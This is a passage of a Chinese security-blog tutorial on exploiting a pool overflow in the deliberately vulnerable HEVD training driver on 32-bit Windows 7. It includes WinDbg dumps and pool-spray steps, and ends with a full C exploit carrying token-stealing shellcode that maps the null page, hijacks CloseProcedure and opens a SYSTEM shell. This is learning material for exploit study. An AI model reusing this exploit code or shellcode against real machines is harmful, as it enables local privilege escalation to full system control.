          +0x000 Waking           : 0y0
    
          +0x000 MultipleShared   : 0y0
    
          +0x000 Shared           : 0y0000000000000000000000000000 (0)
    
          +0x000 Value            : 0
    
          +0x000 Ptr              : (null)
    
       +0x07c Key              : 0x6e657645
    
       +0x080 CallbackList     :  [ 0x85763498 - 0x85763498 ]
    
          +0x000 Flink            : 0x85763498 _LIST_ENTRY [ 0x85763498 - 0x85763498 ]
    
          +0x004 Blink            : 0x85763498 _LIST_ENTRY [ 0x85763498 - 0x85763498 ]

可知对象类型为Event，这里这个结构我们关心偏移0x28 TypeInfo这字段，其下有几个回调函数，这里我们使用偏移0x038
CloseProcedure,如果这个字段有值的话，当程序调用CloseProcedure函数时（即调用CloseHandle），就会执行该字段指向的代码。

如果我们覆盖Event chunk的_OBJECT_HEADER的TypeIndex值为0， 再将0x00000000 + (0x28+0x28) =
0x60,处的值，修改为我们的shellcode地址，当我们调用CloseHandle函数时，就能控制程序流程，执行我们的shellcode。

因为我们只覆盖TypeIndex的值，要保证其他值不变，我们看下poolheader到TypeIndex的值

    
    
    kd> dd 85b10ac0
    
    85b10ac0  04080040 ee657645 00000000 00000040
    
    85b10ad0  00000000 00000000 00000001 00000001
    
    85b10ae0  00000000 0008000c 87cc1640 00000000

需要0008000c覆盖为00080000。

构造数据如下：

    
    
        //构造数据，覆盖_OBJECT_HEADER偏移+0x00c的值覆盖为0，
    
        char junk_buffer[504] = { 0x41 };
    
        memset(junk_buffer, 0x41, 504);
    
        char overwritedata[41] =
    
            "\x40\x00\x08\x04"
    
            "\x45\x76\x65\xee"
    
            "\x00\x00\x00\x00"
    
            "\x40\x00\x00\x00"
    
            "\x00\x00\x00\x00"
    
            "\x00\x00\x00\x00"
    
            "\x01\x00\x00\x00"
    
            "\x01\x00\x00\x00"
    
            "\x00\x00\x00\x00"
    
            "\x00\x00\x08\x00";
    
    
    
        char UserModeBuffer[504 + 40 + 1] = {0};
    
        int UserModeBufferSize = 504 + 40;
    
        memcpy(UserModeBuffer, junk_buffer, 504);
    
        memcpy(UserModeBuffer + 504, overwritedata, 40);

然后我们申请一个起始地址为0的空间，将shellcode的地址写到0x60的位置

    
    
    *(PULONG)0x00000060 = (ULONG)pShellcodeBuf;

最后调用CloseHandle释放恶意构造的chunk。

    
    
        //这个spray_event1释放循环目前来看，好像不是必须的;
    
        for (int i = 0; i < 10000; i++)
    
        {
    
            CloseHandle(spray_event1[i]);
    
        }
    
    
    
        //这里i不能从0开始，因为i从0开始的chunk都是我们已经释放的;
    
        //我们的数据在其中的连续8个chunk上，而被覆盖chunk在释放的chunk后面;
    
        //所以这里i从8开始;
    
        for (int i = 8; i < 5000; i = i + 16)
    
        {
    
            for (int j = 0; j < 8; j++)
    
            {
    
                CloseHandle(spray_event2[i + j]);
    
            }
    
        }

![](https://p4.ssl.qhimg.com/t015e93ccf40c6d1f6b.png)

下面我们简单看下溢出正常执行的情况。

    
    
    kd> dd 0
    
    00000000  00000000 00000000 00000000 00000000
    
    00000010  00000000 00000000 00000000 00000000
    
    00000020  00000000 00000000 00000000 00000000
    
    00000030  00000000 00000000 00000000 00000000
    
    00000040  00000000 00000000 00000000 00000000
    
    00000050  00000000 00000000 00000000 00000000
    
    00000060  000d0000 00000000 00000000 00000000
    
    00000070  00000000 00000000 00000000 00000000

0地址的0x60偏移处，是我们的shellcode地址。

    
    
    kd> uf 000d0000
    
    000d0000 90              nop
    
    000d0001 90              nop
    
    000d0002 90              nop
    
    000d0003 90              nop
    
    000d0004 60              pushad
    
    000d0005 64a124010000    mov     eax,dword ptr fs:[00000124h]
    
    000d000b 8b4050          mov     eax,dword ptr [eax+50h]
    
    000d000e 89c1            mov     ecx,eax
    
    000d0010 8b98f8000000    mov     ebx,dword ptr [eax+0F8h]
    
    000d0016 ba04000000      mov     edx,4
    
    000d001b 8b80b8000000    mov     eax,dword ptr [eax+0B8h]
    
    000d0021 2db8000000      sub     eax,0B8h
    
    000d0026 3990b4000000    cmp     dword ptr [eax+0B4h],edx
    
    000d002c 75ed            jne     000d001b  Branch
    
    000d002e 8b90f8000000    mov     edx,dword ptr [eax+0F8h]
    
    000d0034 8991f8000000    mov     dword ptr [ecx+0F8h],edx
    
    000d003a 61              popad
    
    000d003b c21000          ret     10h

Shellcode的目的就是把当前进程的token值替换为system的token，

后面这个ret 10h， ret后面的值要根据实际情况稍作判断。

贴张运行成功的截图

![](https://p2.ssl.qhimg.com/t014edb2b61a6d30b8d.png)

## 总结

本文并没有涉及太多内核池的结构，管理相关信息，如果想做更深入的研究，这些是必不可少的知识，务必相当熟悉。还有学习时，不要只看，认为自己看懂了就行了，一定要多调试、跟踪。

## 参考

Window内核利用教程4池风水 -> 池溢出

<https://bbs.pediy.com/thread-223719.htm>

Windows exploit开发系列教程第十六部分：内核利用程序之池溢出

<https://bbs.pediy.com/thread-225182.htm>

Windows kernel pool 初探

<https://www.cnblogs.com/flycat-2016/p/5449738.html>

## 附：利用代码：

    
    
    #include <stdio.h>
    
    #include <Windows.h>
    
    
    
    #define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
    
    #define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
    
    
    
    
    
    // Windows 7 SP1 x86 Offsets
    
    #define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
    
    #define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
    
    #define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
    
    #define FLINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
    
    #define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
    
    #define SYSTEM_PID         0x004  // SYSTEM Process PID
    
    
    
    #define DEVICE_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
    
    
    
    #define HACKSYS_EVD_IOCTL_POOL_OVERFLOW                   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_NEITHER, FILE_ANY_ACCESS)
    
    
    
    
    
    
    
    typedef NTSTATUS(WINAPI *NtAllocateVirtualMemory_t)(IN HANDLE     ProcessHandle,
    
        IN OUT PVOID  *BaseAddress,
    
        IN ULONG      ZeroBits,
    
        IN OUT PULONG AllocationSize,
    
        IN ULONG      AllocationType,
    
        IN ULONG      Protect);
    
    
    
    
    
    NtAllocateVirtualMemory_t     NtAllocateVirtualMemory;
    
    
    
    
    
    
    
    BOOL MapNullPage() {
    
    
    
        HMODULE hNtdll;
    
        SIZE_T RegionSize = 0x1000;            // will be rounded up to the next host
    
                                               // page size address boundary -> 0x2000
    
    
    
        PVOID BaseAddress = (PVOID)0x00000001; // will be rounded down to the next host
    
                                               // page size address boundary -> 0x00000000
    
        NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    
    
    
        hNtdll = GetModuleHandle("ntdll.dll");
    
    
    
        // Grab the address of NtAllocateVirtualMemory
    
        NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    
    
    
        if (!NtAllocateVirtualMemory) {
    
            printf("\t\t[-] Failed Resolving NtAllocateVirtualMemory: 0x%X\n", GetLastError());
    
            exit(EXIT_FAILURE);
    
        }
    
    
    
        // Allocate the Virtual memory
    
        NtStatus = NtAllocateVirtualMemory((HANDLE)0xFFFFFFFF,
    
            &BaseAddress,
    
            0,
    
            &RegionSize,
    
            MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
    
            PAGE_EXECUTE_READWRITE);
    
    
    
        if (NtStatus != STATUS_SUCCESS) {
    
            printf("\t\t\t\t[-] Virtual Memory Allocation Failed: 0x%x\n", NtStatus);
    
            exit(EXIT_FAILURE);
    
        }
    
        else {
    
            printf("\t\t\t[+] Memory Allocated: 0x%p\n", BaseAddress);
    
            printf("\t\t\t[+] Allocation Size: 0x%X\n", RegionSize);
    
        }
    
    
    
        FreeLibrary(hNtdll);
    
    
    
        return TRUE;
    
    }
    
    
    
    char shellcode[] =
    
    "\x90\x90\x90\x90"              //# NOP Sled
    
    "\x60"                          //# pushad
    
    "\x64\xA1\x24\x01\x00\x00"      //# mov eax, fs:[KTHREAD_OFFSET]
    
    "\x8B\x40\x50"                  //# mov eax, [eax + EPROCESS_OFFSET]
    
    "\x89\xC1"                      //# mov ecx, eax(Current _EPROCESS structure)
    
    "\x8B\x98\xF8\x00\x00\x00"      //# mov ebx, [eax + TOKEN_OFFSET]
    
    "\xBA\x04\x00\x00\x00"          //# mov edx, 4 (SYSTEM PID)
    
    "\x8B\x80\xB8\x00\x00\x00"      //# mov eax, [eax + FLINK_OFFSET]
    
    "\x2D\xB8\x00\x00\x00"          //# sub eax, FLINK_OFFSET
    
    "\x39\x90\xB4\x00\x00\x00"      //# cmp[eax + PID_OFFSET], edx
    
    "\x75\xED"                      //# jnz
    
    "\x8B\x90\xF8\x00\x00\x00"      //# mov edx, [eax + TOKEN_OFFSET]
    
    "\x89\x91\xF8\x00\x00\x00"      //# mov[ecx + TOKEN_OFFSET], edx
    
    "\x61"                          //# popad
    
    "\xC2\x10\x00";                 //# ret 16
    
    
    
    void xxCreateCmdLineProcess()
    
    {
    
        STARTUPINFO si;
    
        PROCESS_INFORMATION pi;
    
        memset(&si, 0, sizeof(si));
    
        memset(&pi, 0, sizeof(pi));
    
    
    
        si.cb = sizeof(si);
    
        si.dwFlags = STARTF_USESHOWWINDOW;
    
        si.wShowWindow = SW_SHOW;
    
        char szCommandLine[50] = "cmd.exe";
    
        // 创建cmd子进程;
    
        BOOL bReturn = CreateProcess(NULL,
    
            szCommandLine,
    
            NULL,
    
            NULL,
    
            FALSE,
    
            CREATE_NEW_CONSOLE,
    
            NULL,
    
            NULL,
    
            &si,
    
            &pi);
    
    
    
        if (bReturn)
    
        {
    
            //不使用的句柄最好关掉;
    
            printf("process id: %d\n", pi.dwProcessId);
    
            printf("thread id: %d\n", pi.dwThreadId);
    
            //WaitForSingleObject(pi.hProcess, INFINITE);
    
            //CloseHandle(pi.hThread);
    
            //CloseHandle(pi.hProcess);
    
        }
    
        else
    
        {
    
            //如果创建进程失败，查看错误码;
    
            DWORD dwErrCode = GetLastError();
    
            printf("ErrCode : %d\n", dwErrCode);
    
        }
    
    }
    
    
    
    HANDLE GetDeviceHandle(LPCSTR FileName) {
    
        HANDLE hFile = NULL;
    
    
    
        hFile = CreateFile(FileName,
    
            GENERIC_READ | GENERIC_WRITE,
    
            FILE_SHARE_READ | FILE_SHARE_WRITE,
    
            NULL,
    
            OPEN_EXISTING,
    
            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
    
            NULL);
    
    
    
        return hFile;
    
    }
    
    
    
    DWORD WINAPI PoolOverflowThread(LPVOID Parameter) {
    
        ULONG BytesReturned;
    
        HANDLE hFile = NULL;
    
        PVOID Memory = NULL;
    
        LPCSTR FileName = (LPCSTR)DEVICE_NAME;
    
    
    
        // Get the device handle
    
        printf("\t[+] Getting Device Driver Handle\n");
    
        printf("\t\t[+] Device Name: %s\n", FileName);
    
    
    
        hFile = GetDeviceHandle(FileName);
    
    
    
        if (hFile == INVALID_HANDLE_VALUE) {
    
            printf("\t\t[-] Failed Getting Device Handle: 0x%X\n", GetLastError());
    
            exit(EXIT_FAILURE);
    
        }
    
        else {
    
            printf("\t\t[+] Device Handle: 0x%X\n", hFile);
    
        }
    
    
    
        printf("\t[+] Triggering Pool Overflow\n");
    
    
    
        OutputDebugString("****************Kernel Mode****************\n");
    
    
    
    
    
        if (!MapNullPage()) {
    
            printf("\t\t[-] Failed Mapping Null Page: 0x%X\n", GetLastError());
    
            exit(EXIT_FAILURE);
    
        }
    
    
    
        // Set the DeleteProcedure to the address of our payload
    
        int shellcode_len = sizeof(shellcode);
    
        char *pShellcodeBuf = (char*)VirtualAlloc(NULL, shellcode_len, MEM_RESERVE| MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    
        RtlMoveMemory(pShellcodeBuf, shellcode, shellcode_len);
    
    
    
    
    
        printf("ShellCode = %x\n", pShellcodeBuf);
    
        *(PULONG)0x00000060 = (ULONG)pShellcodeBuf;
    
    
    
        //heap spray
    
        HANDLE spray_event1[10000] = { NULL };
    
        HANDLE spray_event2[5000] = { NULL };
    
    
    
        for (int i = 0; i < 10000; i++)
    
        {
    
            spray_event1[i] = CreateEventA(NULL, FALSE, FALSE, NULL);
    
        }
    
    
    
        for (int j = 0; j < 5000; j++)
    
        {
    
            spray_event2[j] = CreateEventA(NULL, FALSE, FALSE, NULL);
    
        }
    
       
    
        for (int i = 5000-1; i >= 4989; i--)
    
        {
    
            printf("%x\n", spray_event2[i]);
    
        }
    
    
    
        //制造堆喷区空洞, 目的使我们的数据分配到空洞上;
    
        for (int i = 0; i < 5000; i = i + 16)
    
        {
    
            for (int j = 0; j < 8; j++)
    
            {
    
                //一个event对象大小0x40,  0x200的空间需要8个event对象;
    
                CloseHandle(spray_event2[i + j]);
    
            }
    
        }
    
    
    
        //构造数据，覆盖_OBJECT_HEADER偏移+0x00c的值覆盖为0，
    
        char junk_buffer[504] = { 0x41 };
    
        memset(junk_buffer, 0x41, 504);
    
        char overwritedata[41] =
    
            "\x40\x00\x08\x04"
    
            "\x45\x76\x65\xee"
    
            "\x00\x00\x00\x00"
    
            "\x40\x00\x00\x00"
    
            "\x00\x00\x00\x00"
    
            "\x00\x00\x00\x00"
    
            "\x01\x00\x00\x00"
    
            "\x01\x00\x00\x00"
    
            "\x00\x00\x00\x00"
    
            "\x00\x00\x08\x00";
    
    
    
        char UserModeBuffer[504 + 40 + 1] = {0};
    
        int UserModeBufferSize = 504 + 40;
    
        memcpy(UserModeBuffer, junk_buffer, 504);
    
        memcpy(UserModeBuffer + 504, overwritedata, 40);
    
    
    
        DeviceIoControl(hFile,
    
            HACKSYS_EVD_IOCTL_POOL_OVERFLOW,
    
            (LPVOID)UserModeBuffer,
    
            (DWORD)UserModeBufferSize,
    
            NULL,
    
            0,
    
            &BytesReturned,
    
            NULL);
    
    
    
        OutputDebugString("****************Kernel Mode****************\n");
    
    
    
        printf("\t\t[+] Triggering Payload\n");
    
    
    
        printf("\t\t\t[+] Freeing Event Objects\n");
    
    
    
        //这个spray_event1释放循环目前来看，好像不是必须的;
    
        for (int i = 0; i < 10000; i++)
    
        {
    
            CloseHandle(spray_event1[i]);
    
        }
    
    
    
        //这里i不能从0开始，因为i从0开始的chunk都是我们已经释放的;
    
        //我们的数据在其中的连续8个chunk上，而被覆盖chunk在释放的chunk后面;
    
        //所以这里i从8开始;
    
        for (int i = 8; i < 5000; i = i + 16)
    
        {
    
            for (int j = 0; j < 8; j++)
    
            {
    
                CloseHandle(spray_event2[i + j]);
    
            }
    
        }
    
    
    
        //这里i从0开始，并不能出现想要的结果，反而会造成蓝屏;
    
        //for (int i = 0; i < 5000; i = i + 16)
    
        //{
    
        //  for (int j = 0; j < 8; j++)
    
        //  {
    
        //      CloseHandle(spray_event2[i + j]);
    
        //  }
    
        //}
    
    
    
        //这样循环也是有可能成功的，当然也可能出现异常情况，比如说，这里面有之前被释放过的chunk，如果被别的程序使用了(重新申请);
    
        //我们这里强制释放其他程序的chunk，可能造成不可预估的后果;
    
        //for (int i = 0; i < 5000; i++)
    
        //{
    
        //  if (!CloseHandle(spray_event2[i]))
    
        //  {
    
        //      printf("\t\t[-] Failed To Close Event Objects Handle: 0x%X\n", GetLastError());
    
        //  }
    
        //}
    
        return EXIT_SUCCESS;
    
    }
    
    
    
    
    
    int main(int argc, char *argv[])
    
    {
    
        //printf("hello world\n");
    
        PoolOverflowThread(NULL);
    
        printf("start to cmd...\n");
    
        xxCreateCmdLineProcess();
    
        return 1;
    
    }

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **PandaIsCoding** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/170446](/post/id/170446)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [系统安全](/tag/系统安全)
  * [HEVD](/tag/HEVD)

 **+1** __0赞

 __收藏

![](https://p0.ssl.qhmsg.com/dm/200_200_100/t011f2416f5f80ad992.jpg)
PandaIsCoding

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

